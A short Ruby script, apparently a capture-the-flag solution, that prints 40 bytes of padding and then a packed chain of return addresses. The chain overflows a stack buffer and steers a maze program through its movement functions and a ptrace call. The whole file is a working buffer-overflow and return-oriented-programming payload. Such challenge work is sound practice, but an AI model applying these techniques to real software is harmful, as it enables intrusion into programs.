#!/usr/bin/env ruby

get_input_stack_size = 0x28
right=0x111c0
down=0x11140
maze=0x11300
ptrace=0x1152b # the TRACEME one, with arguments set up first

print "A"*get_input_stack_size
print [down,maze,down,maze,right,maze,right,maze,right,maze,ptrace].pack("Q*")
